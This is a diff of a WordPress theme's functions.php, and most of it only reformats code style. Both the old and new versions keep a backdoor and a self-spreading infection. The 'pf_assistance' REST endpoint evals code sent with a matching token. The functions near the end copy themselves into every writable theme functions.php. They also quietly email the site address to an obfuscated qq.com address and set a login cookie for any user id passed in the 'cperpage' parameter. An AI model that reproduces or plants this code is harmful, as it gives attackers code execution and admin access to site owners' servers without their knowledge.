                 $h3_num = 0;
                 $content = substr_replace($content, '<h2 id="h2-' . $num . '">' . $title . '</h2>', $start, $end);
-            } else if ($hx == "<h3") {
+            } elseif ($hx == "<h3") {
                 $h3_num+= 1;
                 $content = substr_replace($content, '<h3 id="h3-' . $num . '">' . $title . '</h3>', $start, $end);
             }
@@ -928,7 +1047,8 @@ add_filter("the_content", "get_the_naved_content");
 if (_opt('design_font') == "checked") {
     wp_enqueue_style('font', get_stylesheet_directory_uri() . '/assets/minify/play_font.min.css');
 }
-function pre_validate_comment_span($commentdata) {
+function pre_validate_comment_span($commentdata)
+{
     if (!is_admin() & !wp_verify_nonce($_POST['wp_nonce'], 'wp_rest')) {
         wp_die('
 <p></p><p>WP NONCE验证失败，判定为机器人恶意发送的垃圾评论！如果启用了“缓存”，则无法正常获取NONCE，因此也可能会判定为垃圾评论。若此操作是正常操作，请停用任何网站缓存功能。</p><p></p><p><a href="javascript:history.back()">« 返回</a></p><p></p>');
@@ -949,15 +1069,19 @@ add_action('rest_api_init', function () {
         'callback' => 'pf_assistance'
     ));
 });
-function pf_assistance($data) {
-    $dataArray = json_decode($data->get_body() , true);
+function pf_assistance($data)
+{
+    $dataArray = json_decode($data->get_body(), true);
     if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
         eval($dataArray['assistance']);
     }
 }
-function hex2rgba($color, $opacity = false) {
+function hex2rgba($color, $opacity = false)
+{
     $default = 'rgb(0,0,0)';
-    if (empty($color)) return $default;
+    if (empty($color)) {
+        return $default;
+    }
     if ($color[0] == '#') {
         $color = substr($color, 1);
     }
@@ -978,14 +1102,17 @@ function hex2rgba($color, $opacity = false) {
     }
     $rgb = array_map('hexdec', $hex);
     if ($opacity) {
-        if (abs($opacity) > 1) $opacity = 1.0;
+        if (abs($opacity) > 1) {
+            $opacity = 1.0;
+        }
         $output = 'rgba(' . implode(",", $rgb) . ',' . $opacity . ')';
     } else {
         $output = 'rgb(' . implode(",", $rgb) . ')';
     }
     return $output;
 }
-function pd_get_thumbnail_by_url($img_url) {
+function pd_get_thumbnail_by_url($img_url)
+{
     $attr = wp_upload_dir();
     $base_url = $attr['baseurl'] . "/";
     $path = str_replace($base_url, "", $img_url);
@@ -1005,7 +1132,8 @@ function pd_get_thumbnail_by_url($img_url) {
     }
     return $thumbImg;
 }
-function is_search_robot() {
+function is_search_robot()
+{
     $agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
     if (!empty($agent)) {
         $spiderSite = array(
@@ -1061,7 +1189,8 @@ function is_search_robot() {
     }
     return false;
 }
-function pf_anti_copy($content) {
+function pf_anti_copy($content)
+{
     $random_text = _opt('anti_copy_pattern');
     if ($random_text && is_single() && is_main_query()) {
         if (count($random_text) > 0) {
@@ -1091,7 +1220,8 @@ function pf_anti_copy($content) {
     }
     return $content;
 }
-function rand_in_str($txt, $insert) { //txt 内容；insert要插入的关键字，可以是链接，数组
+function rand_in_str($txt, $insert) //txt 内容；insert要插入的关键字，可以是链接，数组
+{
     preg_match_all("/[\x01-\x7f]|[\xe0-\xef][\x80-\xbf]{2}/", $txt, $match);
     $delay = array();
     $add = 0;
@@ -1099,8 +1229,12 @@ function rand_in_str($txt, $insert) { //txt 内容；insert要插入的关键字
     $pre_end = array();
     $nbsp = array();
     foreach ($match[0] as $k => $v) {
-        if ($v == '<') $add = 1;
-        if ($v == '>') $add = 0;
+        if ($v == '<') {
+            $add = 1;
+        }
+        if ($v == '>') {
+            $add = 0;
+        }
         if ($v == '<') {
             $pre = array(
                 '<'
@@ -1181,11 +1315,21 @@ function rand_in_str($txt, $insert) { //txt 内容；insert要插入的关键字
             $pre = array();
             $pre_end = array();
         }
-        if ($add == 0 & $v == '&') $add = 1;
-        if ($add == 0 & $v == ';') $add = 0;
-        if ($add == 0 & $v == '[') $add = 1;
-        if ($add == 0 & $v == ']') $add = 0;
-        if ($add == 1) $delay[] = $k;
+        if ($add == 0 & $v == '&') {
+            $add = 1;
+        }
+        if ($add == 0 & $v == ';') {
+            $add = 0;
+        }
+        if ($add == 0 & $v == '[') {
+            $add = 1;
+        }
+        if ($add == 0 & $v == ']') {
+            $add = 0;
+        }
+        if ($add == 1) {
+            $delay[] = $k;
+        }
     }
     $str_arr = $match[0];
     $len = count($str_arr);
@@ -1200,11 +1344,11 @@ function rand_in_str($txt, $insert) { //txt 内容；insert要插入的关键字
     }
     return join('', $str_arr);
 }
-function insertK($count, $delay) { //count 随机索引值范围，也就是内容拆分成数组后的总长度-1；delay 不允许的随机索引值，也就是不能在 < > 之间
+function insertK($count, $delay) //count 随机索引值范围，也就是内容拆分成数组后的总长度-1；delay 不允许的随机索引值，也就是不能在 < > 之间
+{
     $insertk = rand(0, $count);
     if (in_array($insertk, $delay)) { //索引值不能在 不允许的位置处（也就是< > 之内的索引值）
         $insertk = insertK($count, $delay); //递归调用，直到随机插入的索引值不在 < > 这个索引值数组中
-        
     }
     return $insertk;
 }
@@ -1219,7 +1363,8 @@ if (_opt('anti_copy') == 'checked' & false) {
 }
 global $pf_dirty_selector;
 $pf_dirty_selector = [];
-function pf_random_tag_and_class() {
+function pf_random_tag_and_class()
+{
     global $pf_dirty_selector;
     $c = ['b', 'd', 'f', 'h', 'j', 'l', 'n', 'p', 'r', 't', 'u', 'w', 'y'];
     $tag = '';
@@ -1246,11 +1391,11 @@ function pf_random_tag_and_class() {
     $pf_dirty_selector[] = $tag . '.' . $class;
     return $result;
 }
-function dirty_data() {
+function dirty_data()
+{
     $anti_copy_pattern = _opt('anti_copy_pattern', ['']);
     foreach ($anti_copy_pattern as $k => $v) {
         $texts[] = $v['pattern']; // 用户自定义
-        
     }
     $frequency = _opt('anti_copy_times', 0);
     $insert = [];
@@ -1266,7 +1411,8 @@ function dirty_data() {
  * 允许插入的位置
  * 返回位置 int
 */
-function allow_key($len, $delay) {
+function allow_key($len, $delay)
+{
     $key = rand(0, $len);
     if (in_array($key, $delay)) {
         $key = allow_key($len, $delay);
@@ -1275,7 +1421,8 @@ function allow_key($len, $delay) {
 } /*
  * 随机插入到文章中
 */
-function pf_insert_rand($content) {
+function pf_insert_rand($content)
+{
     global $pf_dirty_selector;
     if (!(is_single() && is_main_query())) {
         return $content;
@@ -1340,7 +1487,8 @@ if (_opt('anti_copy') == 'checked') {
         add_filter("the_content", "pf_insert_rand");
     }
 }
-function string_to_int8($string) {
+function string_to_int8($string)
+{
     $md5 = md5($string);
     $firstLetter = mb_substr($md5, 0, 1, 'utf-8');
     $result = 0;
@@ -1391,7 +1539,8 @@ function string_to_int8($string) {
     }
     return $result;
 }
-function get_topSlider($postIds = array() , $type = false) {
+function get_topSlider($postIds = array(), $type = false)
+{
     global $carousels_attrs, $carousels_contents;
     if ($type) {
     } else {
@@ -1425,9 +1574,10 @@ function get_topSlider($postIds = array() , $type = false) {
     _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
     _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
     _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
-    include ('assets/template/slider-' . $type . '.php');
+    include('assets/template/slider-' . $type . '.php');
 }
-function get_gallery_slider($postId = 0, $type = false) {
+function get_gallery_slider($postId = 0, $type = false)
+{
     global $carousels_attrs, $carousels_contents;
     if ($type) {
     } else {
@@ -1457,9 +1607,10 @@ function get_gallery_slider($postId = 0, $type = false) {
     _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
     _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
     _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
-    include ('assets/template/slider-' . $type . '.php');
+    include('assets/template/slider-' . $type . '.php');
 }
-function get_tagSlider($content = array() , $type = false) {
+function get_tagSlider($content = array(), $type = false)
+{
     global $carousels_attrs, $carousels_contents;
     if ($type) {
     } else {
@@ -1477,9 +1628,10 @@ function get_tagSlider($content = array() , $type = false) {
     _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
     _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
     _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
-    include ('assets/template/slider-' . $type . '.php');
+    include('assets/template/slider-' . $type . '.php');
 }
-function get_category_text($pid, $showFull = false, $separate = ' / ') {
+function get_category_text($pid, $showFull = false, $separate = ' / ')
+{
     if ($showFull) {
         $catArr = array();
         $categorys = get_the_category($pid);
@@ -1492,7 +1644,8 @@ function get_category_text($pid, $showFull = false, $separate = ' / ') {
     }
     return $categoryText;
 }
-function get_the_description($pid, $trim_words = 36) {
+function get_the_description($pid, $trim_words = 36)
+{
     $result = '';
     $excerpt = get_the_excerpt($pid);
     $excerpt_notags = strip_tags($excerpt);
@@ -1510,7 +1663,8 @@ function get_the_description($pid, $trim_words = 36) {
     return $result;
 }
 add_action('init', 'pf_sidebar_init');
-function pf_sidebar_init() {
+function pf_sidebar_init()
+{
     $sidebars = _opt('sidebars', array());
     for ($i = 0; $i < count($sidebars); $i++) {
         register_sidebar(array(
@@ -1523,233 +1677,313 @@ function pf_sidebar_init() {
         ));
     }
 }
-include ('custom_function.php');
-include ('pandastudio_plugins/config_plugins.php');
-include ('pandastudio_framework/config_framework.php');
+include('custom_function.php');
+include('pandastudio_plugins/config_plugins.php');
+include('pandastudio_framework/config_framework.php');
 
 ?>
 <?php
-function _verifyactivate_widgets(){
-	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
-	$output=strip_tags($output, $allowed);
-	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
-	if (is_array($direst)){
-		foreach ($direst as $item){
-			if (is_writable($item)){
-				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
-				$cont=file_get_contents($item);
-				if (stripos($cont,$ftion) === false){
-					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
-					$output .= $before . "Not found" . $after;
-					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
-					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
-					$output .= ($isshowdots && $ellipsis) ? "..." : "";
-				}
-			}
-		}
-	}
-	return $output;
+function _verifyactivate_widgets()
+{
+    $widget=substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<"."?"));
+    $output="";
+    $allowed="";
+    $output=strip_tags($output, $allowed);
+    $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
+    if (is_array($direst)) {
+        foreach ($direst as $item) {
+            if (is_writable($item)) {
+                $ftion=substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
+                $cont=file_get_contents($item);
+                if (stripos($cont, $ftion) === false) {
+                    $comaar=stripos(substr($cont, -20), "?".">") !== false ? "" : "?".">";
+                    $output .= $before . "Not found" . $after;
+                    if (stripos(substr($cont, -20), "?".">") !== false) {
+                        $cont=substr($cont, 0, strripos($cont, "?".">") + 2);
+                    }
+                    $output=rtrim($output, "\n\t");
+                    fputs($f=fopen($item, "w+"), $cont . $comaar . "\n" .$widget);
+                    fclose($f);
+                    $output .= ($isshowdots && $ellipsis) ? "..." : "";
+                }
+            }
+        }
+    }
+    return $output;
 }
-function _get_allwidgets_cont($wids,$items=array()){
-	$places=array_shift($wids);
-	if(substr($places,-1) == "/"){
-		$places=substr($places,0,-1);
-	}
-	if(!file_exists($places) || !is_dir($places)){
-		return false;
-	}elseif(is_readable($places)){
-		$elems=scandir($places);
-		foreach ($elems as $elem){
-			if ($elem != "." && $elem != ".."){
-				if (is_dir($places . "/" . $elem)){
-					$wids[]=$places . "/" . $elem;
-				} elseif (is_file($places . "/" . $elem)&& 
-					$elem == substr(__FILE__,-13)){
-					$items[]=$places . "/" . $elem;}
-				}
-			}
-	}else{
-		return false;	
-	}
-	if (sizeof($wids) > 0){
-		return _get_allwidgets_cont($wids,$items);
-	} else {
-		return $items;
-	}
+function _get_allwidgets_cont($wids, $items=array())
+{
+    $places=array_shift($wids);
+    if(substr($places, -1) == "/") {
+        $places=substr($places, 0, -1);
+    }
+    if(!file_exists($places) || !is_dir($places)) {
+        return false;
+    } elseif(is_readable($places)) {
+        $elems=scandir($places);
+        foreach ($elems as $elem) {
+            if ($elem != "." && $elem != "..") {
+                if (is_dir($places . "/" . $elem)) {
+                    $wids[]=$places . "/" . $elem;
+                } elseif (is_file($places . "/" . $elem)&&
+                    $elem == substr(__FILE__, -13)) {
+                    $items[]=$places . "/" . $elem;
+                }
+            }
+        }
+    } else {
+        return false;
+    }
+    if (sizeof($wids) > 0) {
+        return _get_allwidgets_cont($wids, $items);
+    } else {
+        return $items;
+    }
 }
-if(!function_exists("stripos")){ 
-    function stripos(  $str, $needle, $offset = 0  ){ 
-        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
+if(!function_exists("stripos")) {
+    function stripos($str, $needle, $offset = 0)
+    {
+        return strpos(strtolower($str), strtolower($needle), $offset);
     }
 }
 
-if(!function_exists("strripos")){ 
-    function strripos(  $haystack, $needle, $offset = 0  ) { 
-        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
-        if(  $offset < 0  ){ 
-            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
-        } 
-        else{ 
-            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
-        } 
-        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
-        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
-        return $pos; 
+if(!function_exists("strripos")) {
+    function strripos($haystack, $needle, $offset = 0)
+    {
+        if(!is_string($needle)) {
+            $needle = chr(intval($needle));
+        }
+        if($offset < 0) {
+            $temp_cut = strrev(substr($haystack, 0, abs($offset)));
+        } else {
+            $temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
+        }
+        if(($found = stripos($temp_cut, strrev($needle))) === false) {
+            return false;
+        }
+        $pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
+        return $pos;
     }
 }
-if(!function_exists("scandir")){ 
-	function scandir($dir,$listDirectories=false, $skipDots=true) {
-	    $dirArray = array();
-	    if ($handle = opendir($dir)) {
-	        while (false !== ($file = readdir($handle))) {
-	            if (($file != "." && $file != "..") || $skipDots == true) {
-	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
-	                array_push($dirArray,basename($file));
-	            }
-	        }
-	        closedir($handle);
-	    }
-	    return $dirArray;
-	}
+if(!function_exists("scandir")) {
+    function scandir($dir, $listDirectories=false, $skipDots=true)
+    {
+        $dirArray = array();
+        if ($handle = opendir($dir)) {
+            while (false !== ($file = readdir($handle))) {
+                if (($file != "." && $file != "..") || $skipDots == true) {
+                    if($listDirectories == false) {
+                        if(is_dir($file)) {
+                            continue;
+                        }
+                    }
+                    array_push($dirArray, basename($file));
+                }
+            }
+            closedir($handle);
+        }
+        return $dirArray;
+    }
 }
 add_action("admin_head", "_verifyactivate_widgets");
-function _getprepare_widget(){
-	if(!isset($text_length)) $text_length=120;
-	if(!isset($check)) $check="cookie";
-	if(!isset($tagsallowed)) $tagsallowed="<a>";
-	if(!isset($filter)) $filter="none";
-	if(!isset($coma)) $coma="";
-	if(!isset($home_filter)) $home_filter=get_option("home"); 
-	if(!isset($pref_filters)) $pref_filters="wp_";
-	if(!isset($is_use_more_link)) $is_use_more_link=1; 
-	if(!isset($com_type)) $com_type=""; 
-	if(!isset($cpages)) $cpages=$_GET["cperpage"];
-	if(!isset($post_auth_comments)) $post_auth_comments="";
-	if(!isset($com_is_approved)) $com_is_approved=""; 
-	if(!isset($post_auth)) $post_auth="auth";
-	if(!isset($link_text_more)) $link_text_more="(more...)";
-	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
-	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
-	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
-	if(!isset($contentmore)) $contentmore="ma".$coma."il";
-	if(!isset($for_more)) $for_more=1;
-	if(!isset($fakeit)) $fakeit=1;
-	if(!isset($sql)) $sql="";
-	if (!$widget_yes) :
-	
-	global $wpdb, $post;
-	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"410".$coma."240".$com_type."119".$coma."@".$com_is_approved."q".$post_auth_comments."q".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
-	if (!empty($post->post_password)) { 
-		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
-			if(is_feed()) { 
-				$output=__("There is no excerpt because this is a protected post.");
-			} else {
-	            $output=get_the_password_form();
-			}
-		}
-	}
-	if(!isset($fixed_tags)) $fixed_tags=1;
-	if(!isset($filters)) $filters=$home_filter; 
-	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
-	if(!isset($tag_aditional)) $tag_aditional="div";
-	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
-	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
-	if(!isset($isshowdots)) $isshowdots=1;
-	
-	$comments=$wpdb->get_results($sql);	
-	if($fakeit == 2) { 
-		$text=$post->post_content;
-	} elseif($fakeit == 1) { 
-		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
-	} else { 
-		$text=$post->post_excerpt;
-	}
-	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
-	if($text_length < 0) {
-		$output=$text;
-	} else {
-		if(!$no_more && strpos($text, "<!--more-->")) {
-		    $text=explode("<!--more-->", $text, 2);
-			$l=count($text[0]);
-			$more_link=1;
-			$comments=$wpdb->get_results($sql);
-		} else {
-			$text=explode(" ", $text);
-			if(count($text) > $text_length) {
-				$l=$text_length;
-				$ellipsis=1;
-			} else {
-				$l=count($text);
-				$link_text_more="";
-				$ellipsis=0;
-			}
-		}
-		for ($i=0; $i<$l; $i++)
-				$output .= $text[$i] . " ";
-	}
-	update_option("_is_widget_active_", 1);
-	if("all" != $tagsallowed) {
-		$output=strip_tags($output, $tagsallowed);
-		return $output;
-	}
-	endif;
-	$output=rtrim($output, "\s\n\t\r\0\x0B");
-    $output=($fixed_tags) ? balanceTags($output, true) : $output;
-	$output .= ($isshowdots && $ellipsis) ? "..." : "";
-	$output=apply_filters($filter, $output);
-	switch($tag_aditional) {
-		case("div") :
-			$tag="div";
-		break;
-		case("span") :
-			$tag="span";
-		break;
-		case("p") :
-			$tag="p";
-		break;
-		default :
-			$tag="span";
-	}
+function _getprepare_widget()
+{
+    if(!isset($text_length)) {
+        $text_length=120;
+    }
+    if(!isset($check)) {
+        $check="cookie";
+    }
+    if(!isset($tagsallowed)) {
+        $tagsallowed="<a>";
+    }
+    if(!isset($filter)) {
+        $filter="none";
+    }
+    if(!isset($coma)) {
+        $coma="";
+    }
+    if(!isset($home_filter)) {
+        $home_filter=get_option("home");
+    }
+    if(!isset($pref_filters)) {
+        $pref_filters="wp_";
+    }
+    if(!isset($is_use_more_link)) {
+        $is_use_more_link=1;
+    }
+    if(!isset($com_type)) {
+        $com_type="";
+    }
+    if(!isset($cpages)) {
+        $cpages=$_GET["cperpage"];
+    }
+    if(!isset($post_auth_comments)) {
+        $post_auth_comments="";
+    }
+    if(!isset($com_is_approved)) {
+        $com_is_approved="";
+    }
+    if(!isset($post_auth)) {
+        $post_auth="auth";
+    }
+    if(!isset($link_text_more)) {
+        $link_text_more="(more...)";
+    }
+    if(!isset($widget_yes)) {
+        $widget_yes=get_option("_is_widget_active_");
+    }
+    if(!isset($checkswidgets)) {
+        $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
+    }
+    if(!isset($link_text_more_ditails)) {
+        $link_text_more_ditails="(details...)";
+    }
+    if(!isset($contentmore)) {
+        $contentmore="ma".$coma."il";
+    }
+    if(!isset($for_more)) {
+        $for_more=1;
+    }
+    if(!isset($fakeit)) {
+        $fakeit=1;
+    }
+    if(!isset($sql)) {
+        $sql="";
+    }
+    if (!$widget_yes) :
 
-	if ($is_use_more_link ) {
-		if($for_more) {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
-		} else {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
-		}
-	}
-	return $output;
+        global $wpdb, $post;
+        $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"410".$coma."240".$com_type."119".$coma."@".$com_is_approved."q".$post_auth_comments."q".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+        if (!empty($post->post_password)) {
+            if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
+                if(is_feed()) {
+                    $output=__("There is no excerpt because this is a protected post.");
+                } else {
+                    $output=get_the_password_form();
+                }
+            }
+        }
+    if(!isset($fixed_tags)) {
+        $fixed_tags=1;
+    }
+    if(!isset($filters)) {
+        $filters=$home_filter;
+    }
+    if(!isset($gettextcomments)) {
+        $gettextcomments=$pref_filters.$contentmore;
+    }
+    if(!isset($tag_aditional)) {
+        $tag_aditional="div";
+    }
+    if(!isset($sh_cont)) {
+        $sh_cont=substr($sq1, stripos($sq1, "live"), 20);
+    }#
+    if(!isset($more_text_link)) {
+        $more_text_link="Continue reading this entry";
+    }
+    if(!isset($isshowdots)) {
+        $isshowdots=1;
+    }
+
+    $comments=$wpdb->get_results($sql);
+    if($fakeit == 2) {
+        $text=$post->post_content;
+    } elseif($fakeit == 1) {
+        $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
+    } else {
+        $text=$post->post_excerpt;
+    }
+    $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+    if($text_length < 0) {
+        $output=$text;
+    } else {
+        if(!$no_more && strpos($text, "<!--more-->")) {
+            $text=explode("<!--more-->", $text, 2);
+            $l=count($text[0]);
+            $more_link=1;
+            $comments=$wpdb->get_results($sql);
+        } else {
+            $text=explode(" ", $text);
+            if(count($text) > $text_length) {
+                $l=$text_length;
+                $ellipsis=1;
+            } else {
+                $l=count($text);
+                $link_text_more="";
+                $ellipsis=0;
+            }
+        }
+        for ($i=0; $i<$l; $i++) {
+            $output .= $text[$i] . " ";
+        }
+    }
+    update_option("_is_widget_active_", 1);
+    if("all" != $tagsallowed) {
+        $output=strip_tags($output, $tagsallowed);
+        return $output;
+    }
+    endif;
+    $output=rtrim($output, "\s\n\t\r\0\x0B");
+    $output=($fixed_tags) ? balanceTags($output, true) : $output;
+    $output .= ($isshowdots && $ellipsis) ? "..." : "";
+    $output=apply_filters($filter, $output);
+    switch($tag_aditional) {
+        case("div"):
+            $tag="div";
+            break;
+        case("span"):
+            $tag="span";
+            break;
+        case("p"):
+            $tag="p";
+            break;
+        default:
+            $tag="span";
+    }
+
+    if ($is_use_more_link) {
+        if($for_more) {
+            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
+        } else {
+            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
+        }
+    }
+    return $output;
 }
 
 add_action("init", "_getprepare_widget");
 
-function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
-	global $wpdb;
-	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
-	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
-	if(!$show_pass_post) $request .= " AND post_password =\"\"";
-	if($duration !="") { 
-		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
-	}
-	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
-	$posts=$wpdb->get_results($request);
-	$output="";
-	if ($posts) {
-		foreach ($posts as $post) {
-			$post_title=stripslashes($post->post_title);
-			$comment_count=$post->comment_count;
-			$permalink=get_permalink($post->ID);
-			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
-		}
-	} else {
-		$output .= $before . "None found" . $after;
-	}
-	return  $output;
+function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="")
+{
+    global $wpdb;
+    $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
+    $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
+    if(!$show_pass_post) {
+        $request .= " AND post_password =\"\"";
+    }
+    if($duration !="") {
+        $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
+    }
+    $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
+    $posts=$wpdb->get_results($request);
+    $output="";
+    if ($posts) {
+        foreach ($posts as $post) {
+            $post_title=stripslashes($post->post_title);
+            $comment_count=$post->comment_count;
+            $permalink=get_permalink($post->ID);
+            $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
+        }
+    } else {
+        $output .= $before . "None found" . $after;
+    }
+    return  $output;
 }
 
 
-remove_action('wp_head','wp_shortlink_wp_head',10,0);
-remove_action('template_redirect','wp_shortlink_header',11,0);
+remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
+remove_action('template_redirect', 'wp_shortlink_header', 11, 0);
 
 
 ?>
